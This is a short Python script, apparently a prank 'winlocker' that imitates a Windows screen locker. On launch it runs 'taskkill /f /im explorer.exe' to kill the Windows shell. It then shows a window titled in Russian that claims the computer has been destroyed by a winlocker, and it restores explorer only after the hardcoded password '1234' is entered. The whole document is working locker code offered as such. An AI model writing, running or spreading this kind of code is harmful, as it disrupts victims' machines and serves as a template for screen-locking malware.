from tkinter import *
from tkinter import ttk
from tkinter.messagebox import showerror, showwarning, showinfo
import progress.bar as pb
import time
import os

os.system('CLS')

os.system('taskkill /f /im explorer.exe')

import customtkinter

customtkinter.set_appearance_mode("System")  # Modes: system (default), light, dark
customtkinter.set_default_color_theme("blue")  # Themes: blue (default), dark-blue, green

app = customtkinter.CTk()  # create CTk window like you do with the Tk window
app.geometry("400x100")
app.title("ТВОЙ КОМП УНИЧТОЖАН ОТ ВИНЛОКЕРА ЛООЛ")

password = '1234'


def b1f():

	global password
	written_password=e.get()

	if (written_password==password):
		bar = pb.ShadyBar("Загрузка файлов...", max=100)
		for i in range(100):
			bar.next()
			time.sleep(0.1)
		bar.finish()
		os.system('start explorer')
	else:
		showerror(title="ВИНЛОКЕР", message="неправильный пароль!")



# Use CTkButton instead of tkinter Button
b1 = customtkinter.CTkButton(master=app, text="ВЕРНУТЬ ВИНДУ", command=b1f)
b1.place(relx=0.5, rely=0.4, anchor=customtkinter.CENTER)

e = Entry(app, text='password')
e.pack()


app.mainloop()